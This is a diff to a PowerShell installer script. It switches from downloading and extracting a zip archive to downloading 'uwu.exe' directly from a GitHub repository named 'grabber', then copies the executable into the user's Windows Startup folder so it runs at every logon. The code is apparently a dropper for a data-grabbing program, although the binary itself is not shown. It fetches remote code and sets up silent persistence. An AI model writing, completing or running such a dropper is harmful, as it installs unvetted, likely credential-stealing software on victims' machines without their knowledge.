@@ -60,34 +60,6 @@ function Write-InstallInfo {
 
     $host.UI.RawUI.ForegroundColor = $backup
 }
-function Expand-ZipArchive {
-    param(
-        [String] $path,
-        [String] $to
-    )
-
-    if (!(Test-Path $path)) {
-        Deny-Install "Unzip failed: can't find $path to unzip."
-    }
-
-    # Check if the zip file is locked, by antivirus software for example
-    $retries = 0
-    while ($retries -le 10) {
-        if ($retries -eq 10) {
-            Deny-Install "Unzip failed: can't unzip because a process is locking the file."
-        }
-        if (Test-isFileLocked $path) {
-            Write-InstallInfo "Waiting for $path to be unlocked by another process... ($retries/10)"
-            $retries++
-            Start-Sleep -Seconds 2
-        } else {
-            break
-        }
-    }
-
-    # PowerShell 5+: use Expand-Archive to extract zip files
-    Microsoft.PowerShell.Archive\Expand-Archive -Path $path -DestinationPath $to -Force -Verbose:$false
-}
 function Install {
     Write-InstallInfo "Initializing..."
     # Enable TLS 1.2
@@ -96,19 +68,12 @@ function Install {
     # Download zip from GitHub
     Write-InstallInfo "Downloading..."
     $downloader = Get-Downloader
-    $zipfile = "$APP_DIR\uwu.zip"
+    $file = "$APP_DIR\uwu.exe"
     if (!(Test-Path $APP_DIR)) {
         New-Item -Type Directory $APP_DIR | Out-Null
     }
-    Write-Verbose "Downloading to $zipfile"
-    $downloader.downloadFile($repo, $zipfile)
-   
-    # Extract files from downloaded zip
-    Write-InstallInfo "Extracting..."
-    $unzipTempDir = "$APP_DIR\_tmp"
-    Write-Verbose "Extracting to $unzipTempDir"
-    Expand-ZipArchive $zipfile $unzipTempDir
-    Copy-Item "$unzipTempDir\uwu.exe" $APP_DIR -Force
+    Write-Verbose "Downloading to $file"
+    $downloader.downloadFile($exe, $file)
     
     # Add to startup folder
     Copy-Item "$APP_DIR\uwu.exe" $STARTUP -Force
@@ -123,7 +88,7 @@ function Install {
     Write-InstallInfo "Done!"
 }
 # Vars
-$repo = "https://github.com/thaddeuskkr/grabber/archive/master.zip"
+$exe = "https://github.com/thaddeuskkr/grabber/raw/master/uwu.exe"
 $APP_DIR = "$env:USERPROFILE\uwu"
 $STARTUP = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 # Quit if anything goes wrong
